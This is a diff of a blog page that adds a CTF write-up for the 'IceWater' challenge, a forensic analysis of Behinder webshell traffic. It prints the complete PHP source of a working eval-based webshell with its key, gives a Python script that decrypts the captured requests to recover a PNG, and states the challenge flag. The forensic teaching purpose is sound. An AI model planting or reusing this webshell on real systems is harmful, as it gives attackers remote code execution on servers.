@@ -12,9 +12,9 @@
   <meta itemprop="name" content="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup">
   <meta itemprop="description" content="最近这一段时间一直被科研和毕设上的事拖着，因此就有段时间没有做Misc题了
 趁着写毕设没啥思路和动力的功夫，来稍微复盘下今年西湖论剑的题">
-  <meta itemprop="datePublished" content="2025-04-17T12:35:37+08:00">
-  <meta itemprop="dateModified" content="2025-04-17T12:35:37+08:00">
-  <meta itemprop="wordCount" content="3736">
+  <meta itemprop="datePublished" content="2025-04-19T15:35:37+08:00">
+  <meta itemprop="dateModified" content="2025-04-19T15:35:37+08:00">
+  <meta itemprop="wordCount" content="3997">
   <meta itemprop="keywords" content="CTF,Misc,Writeup"><meta property="og:url" content="https://goodlunatic.github.io/posts/f002407/">
   <meta property="og:site_name" content="⚡Lunatic BLOG⚡">
   <meta property="og:title" content="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup">
@@ -24,8 +24,8 @@
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
   <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-04-17T12:35:37+08:00">
-    <meta property="article:modified_time" content="2025-04-17T12:35:37+08:00">
+    <meta property="article:published_time" content="2025-04-19T15:35:37+08:00">
+    <meta property="article:modified_time" content="2025-04-19T15:35:37+08:00">
     <meta property="article:tag" content="CTF">
     <meta property="article:tag" content="Misc">
     <meta property="article:tag" content="Writeup">
@@ -45,8 +45,8 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/goodlunatic.github.io\/posts\/f002407\/"
-    },"genre": "posts","keywords": "CTF, Misc, Writeup","wordcount":  3736 ,
-    "url": "https:\/\/goodlunatic.github.io\/posts\/f002407\/","datePublished": "2025-04-17T12:35:37+08:00","dateModified": "2025-04-17T12:35:37+08:00","publisher": {
+    },"genre": "posts","keywords": "CTF, Misc, Writeup","wordcount":  3997 ,
+    "url": "https:\/\/goodlunatic.github.io\/posts\/f002407\/","datePublished": "2025-04-19T15:35:37+08:00","dateModified": "2025-04-19T15:35:37+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
@@ -149,7 +149,7 @@
 <article class="page single">
   <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup</span>
     </h1></div><div class="post-meta">
-    <div class="post-meta-line"><span class="post-author"><a href="https://goodlunatic.github.io" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://www.nssctf.cn/files/2024/4/28/7f130a1387.png" alt="Lunatic" data-title="Lunatic" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Lunatic</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/writeup/" class="post-category" title="Category - Writeup"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Writeup</a></span></div><div class="post-meta-line"><span title="published on &lt;no value&gt;"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-17">2025-04-17</time></span>&nbsp;<span title=""><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 3800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>18 minutes</span>&nbsp;</div>
+    <div class="post-meta-line"><span class="post-author"><a href="https://goodlunatic.github.io" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://www.nssctf.cn/files/2024/4/28/7f130a1387.png" alt="Lunatic" data-title="Lunatic" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Lunatic</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/writeup/" class="post-category" title="Category - Writeup"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Writeup</a></span></div><div class="post-meta-line"><span title="published on &lt;no value&gt;"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-19">2025-04-19</time></span>&nbsp;<span title=""><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 4000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>19 minutes</span>&nbsp;</div>
   </div><div class="details toc" id="toc-static"
     data-kept="false">
     <div class="details-summary toc-title">
@@ -1319,11 +1319,209 @@
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="题目名称-icewater" class="heading-element">
-  <a href="#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-icewater" class="heading-mark"></a>题目名称 IceWater</h3><h3 id="题目名称-并非乱ping" class="heading-element">
+  <a href="#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-icewater" class="heading-mark"></a>题目名称 IceWater</h3><p>打开流量包，发现是webshell流量，直接拿CTF-NetA梭一下</p>
+<p>根据默认密钥 <code>e45e329feb5d925b</code>，我们可以知道是冰蝎流量分析</p>
+<p><img loading="lazy" src="imgs/image-20250417210225286.png" alt="imgs/image-20250417210225286.png" srcset="imgs/image-20250417210225286.png?size=small, imgs/image-20250417210225286.png?size=medium 1.5x, imgs/image-20250417210225286.png?size=large 2x" data-title="imgs/image-20250417210225286.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>流量包不多，我们手动解密分析了前面几个流量包后发现，一共有两个马，分别是<code>shell.php</code>和<code>she1l.php</code></p>
+<p><img loading="lazy" src="imgs/image-20250419154429421.png" alt="imgs/image-20250419154429421.png" srcset="imgs/image-20250419154429421.png?size=small, imgs/image-20250419154429421.png?size=medium 1.5x, imgs/image-20250419154429421.png?size=large 2x" data-title="imgs/image-20250419154429421.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419154438433.png" alt="imgs/image-20250419154438433.png" srcset="imgs/image-20250419154438433.png?size=small, imgs/image-20250419154438433.png?size=medium 1.5x, imgs/image-20250419154438433.png?size=large 2x" data-title="imgs/image-20250419154438433.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后解密HTTP流4的数据，可以得到第二个马的源码</p>
+<p><img loading="lazy" src="imgs/image-20250419154513307.png" alt="imgs/image-20250419154513307.png" srcset="imgs/image-20250419154513307.png?size=small, imgs/image-20250419154513307.png?size=medium 1.5x, imgs/image-20250419154513307.png?size=large 2x" data-title="imgs/image-20250419154513307.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419154537135.png" alt="imgs/image-20250419154537135.png" srcset="imgs/image-20250419154537135.png?size=small, imgs/image-20250419154537135.png?size=medium 1.5x, imgs/image-20250419154537135.png?size=large 2x" data-title="imgs/image-20250419154537135.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419154550735.png" alt="imgs/image-20250419154550735.png" srcset="imgs/image-20250419154550735.png?size=small, imgs/image-20250419154550735.png?size=medium 1.5x, imgs/image-20250419154550735.png?size=large 2x" data-title="imgs/image-20250419154550735.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419154618668.png" alt="imgs/image-20250419154618668.png" srcset="imgs/image-20250419154618668.png?size=small, imgs/image-20250419154618668.png?size=medium 1.5x, imgs/image-20250419154618668.png?size=large 2x" data-title="imgs/image-20250419154618668.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight" id="id-15"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">key</span><span class="o">=</span><span class="s2">&#34;5b4582c9d56b5b33&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;k&#39;</span><span class="p">]</span><span class="o">=</span><span class="err">$</span><span class="n">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">post</span><span class="o">=</span><span class="n">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">extension_loaded</span><span class="p">(</span><span class="s1">&#39;openssl&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">t</span><span class="o">=</span><span class="s2">&#34;base64_&#34;</span><span class="o">.</span><span class="s2">&#34;decode&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">post</span><span class="o">=</span><span class="err">$</span><span class="n">t</span><span class="p">(</span><span class="err">$</span><span class="n">post</span><span class="o">.</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">		<span class="k">for</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="err">$</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="err">$</span><span class="n">post</span><span class="p">);</span><span class="err">$</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    			 <span class="err">$</span><span class="n">post</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="err">$</span><span class="n">post</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="err">$</span><span class="n">key</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">post</span><span class="o">=</span><span class="n">openssl_decrypt</span><span class="p">(</span><span class="err">$</span><span class="n">post</span><span class="p">,</span> <span class="s2">&#34;AES128&#34;</span><span class="p">,</span> <span class="err">$</span><span class="n">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">arr</span><span class="o">=</span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="err">$</span><span class="n">post</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">func</span><span class="o">=</span><span class="err">$</span><span class="n">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">params</span><span class="o">=</span><span class="err">$</span><span class="n">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">C</span><span class="p">{</span><span class="n">public</span> <span class="n">function</span> <span class="n">__invoke</span><span class="p">(</span><span class="err">$</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span><span class="nb">eval</span><span class="p">(</span><span class="err">$</span><span class="n">p</span><span class="o">.</span><span class="s2">&#34;&#34;</span><span class="p">);}}</span>
+</span></span><span class="line"><span class="cl">    <span class="nd">@call_user_func</span><span class="p">(</span><span class="n">new</span> <span class="n">C</span><span class="p">(),</span><span class="err">$</span><span class="n">params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后发现第二个马的密钥不是默认密钥了，是 <code>5b4582c9d56b5b33</code></p>
+<p>并且加密方式也换成了AES-CBC，IV为<code>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></p>
+<p><img loading="lazy" src="imgs/image-20250419154902953.png" alt="imgs/image-20250419154902953.png" srcset="imgs/image-20250419154902953.png?size=small, imgs/image-20250419154902953.png?size=medium 1.5x, imgs/image-20250419154902953.png?size=large 2x" data-title="imgs/image-20250419154902953.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后当我们分析到HTTP流7和流8的时候，发现攻击者创建了一张PNG图片</p>
+<p><img loading="lazy" src="imgs/image-20250419155450612.png" alt="imgs/image-20250419155450612.png" srcset="imgs/image-20250419155450612.png?size=small, imgs/image-20250419155450612.png?size=medium 1.5x, imgs/image-20250419155450612.png?size=large 2x" data-title="imgs/image-20250419155450612.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419155506249.png" alt="imgs/image-20250419155506249.png" srcset="imgs/image-20250419155506249.png?size=small, imgs/image-20250419155506249.png?size=medium 1.5x, imgs/image-20250419155506249.png?size=large 2x" data-title="imgs/image-20250419155506249.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这个流里有好多个请求和响应，我们继续分析后面的请求，发现攻击者一直在往这个PNG里加东西</p>
+<p>猜测是这个图片比较大，攻击者分了好几次写入</p>
+<p><img loading="lazy" src="imgs/image-20250419155644798.png" alt="imgs/image-20250419155644798.png" srcset="imgs/image-20250419155644798.png?size=small, imgs/image-20250419155644798.png?size=medium 1.5x, imgs/image-20250419155644798.png?size=large 2x" data-title="imgs/image-20250419155644798.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>鉴于流量包中的请求比较多，因此我们把流7和流8的数据以文本的形式保存到本地，然后写个脚本匹配提取即可</p>
+<div class="highlight" id="id-16"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;5b4582c9d56b5b33&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># 默认填充到16字节(AES-128)</span>
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_aes_cbc</span><span class="p">(</span><span class="n">ciphertext_base64</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ciphertext_base64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decrypted</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">func1</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;1.txt&#34;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req_data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Cookie: PHPSESSID=m76qslkgb4tuu1ocg07i1rr1f0\n\n(.*?)\nHTTP/1&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(len(req_data))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">enc_data</span> <span class="ow">in</span> <span class="n">req_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># print(enc_data)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dec_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypt_aes_cbc</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(len(dec_data))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;2.txt&#34;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dec_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">func2</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;2.txt&#34;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base64_data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;base64_decode\(&#39;(.*?)&#39;\)\);&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">base64_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># print(item[-100:])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dec_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">item</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(len(dec_data))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;3.txt&#34;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dec_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">func3</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;3.txt&#34;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base64_data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;\$content=</span><span class="se">\&#34;</span><span class="s2">(.*?)</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(len(base64_data))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base64_png</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">base64_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">png_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64_png</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag.png&#34;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">png_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># func1()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># func2()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">func3</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>提取完整后可以得到下图</p>
+<p><img loading="lazy" src="imgs/image-20250419162534043.png" alt="imgs/image-20250419162534043.png" srcset="imgs/image-20250419162534043.png?size=small, imgs/image-20250419162534043.png?size=medium 1.5x, imgs/image-20250419162534043.png?size=large 2x" data-title="imgs/image-20250419162534043.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后用工具提取一下盲水印即可得到最后的flag：<code>DASCTF{7da5cf04-f7ae-42cf-b98c-7a758a257a65}</code></p>
+<p>当然，这里也可以多换几个工具来提取，找到提取最清晰的即可</p>
